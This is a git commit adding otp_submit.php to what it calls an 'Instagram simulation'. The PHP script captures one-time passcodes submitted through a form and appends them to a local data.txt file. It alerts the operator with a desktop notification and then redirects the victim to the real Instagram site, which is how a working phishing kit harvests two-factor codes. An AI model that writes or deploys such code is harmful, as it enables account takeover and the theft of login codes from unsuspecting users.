5fff5b698944aa612f0c3a86c85264cb72a7e36b
arabmistcoffeegenie <shahulsauri@gmail.com>
2025-04-06 18:14:46 +0100

    Initial commit - Instagram simulation

---
+++ otp_submit.php
@@ -0,0 +1,11 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+$data = "OTP: " . $_POST['otp'] . "\n";
+$data .= "========================\n\n";
+
+file_put_contents("data.txt", $data, FILE_APPEND);
+exec("osascript -e 'display notification \"OTP submitted\" with title \"InstaSim\" sound name \"Submarine\"'");
+header("Location: https://www.instagram.com/");
+exit;
+?>
